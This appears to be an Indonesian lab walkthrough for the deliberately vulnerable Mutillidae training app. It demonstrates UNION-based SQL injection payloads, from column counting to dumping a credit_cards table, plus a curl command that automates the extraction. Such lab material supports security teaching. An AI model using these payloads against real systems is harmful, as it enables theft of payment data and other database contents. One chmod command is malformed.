# Mutillidae Lesson 8

#### SQL Injection (Contoh #1)
- Pada halaman User Info, lakukan inspect element pada form Name dan ubah nilai size menjadi 100.
```
"size=100"`
```
- Isi form Name dengan string berikut
	```
    ' union select null -- //selalu tambahkan spasi setelah "--"
    ```
- Klik View Account Details
- Keterangan: Jumlah null melambangkan jumlah field pada tabel. 
- Hasil error disebabkan karena jumlah field tidak sesuai.


#### SQL Injection (Contoh #2)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select null,null,null,null,null -- //selalu tambahkan spasi setelah "--"
```
- Klik View Account Details
- Keterangan: Untuk mengetahui jumlah field pada tabel dengan diulang dengan mencoba-coba hingga tidak terjadi error. Pada contoh diatas jumlah field-nya ada 5 sehingga ditulis null sebanyak 5.
- Hasilnya kosong karena nilai yang dimasukkan semuanya null.

#### SQL Injection (Contoh #3)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select 1,2,3,4,5 -- //selalu tambahkan spasi setelah "--"
```
- Keterangan: Tujuannya adalah untuk mencari tahu urutan field pada tabel. Urutan field username, password, dan signature didapatkan sesuai dengan nilai yang dimasukkan.

#### SQL Injection (Contoh #4)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards --  //selalu tambahkan spasi setelah "--"
```
- Keterangan: Tujuannya adalah untuk mencari mengambil nilai dari tabel credit_cards sesuai dengan urutannya.
- Hasil :
```
Username berisi ccnumber
Password berisi ccv
Signature berisi expiration
```

#### SQL Injection (Contoh #5)
- Tujuannya sama dengan Contoh #4 dengan perbedaan pada metode yang menggunakan curl.
- Buka terminal dan jalankan perintah dibawah
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[ip_metasploit]/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
```
- Maka hasilnya akan sama dengan Contoh #4.
- Untuk menyimpan hasil kedalam sebuah file jalankan perintah berikut
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[ip_metasploit]/mutillidae/index.php" | grep -i "Username="  > lesson8.txt
cat lesson8.txt
```
- Karena hasilnya susah dibaca, download dan jalankan output parser
```
cd /root
wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT
mv lesson8.pl.TXT lesson8.pl
chmod 700
lesson8.pl
./lesson8.pl
```
    
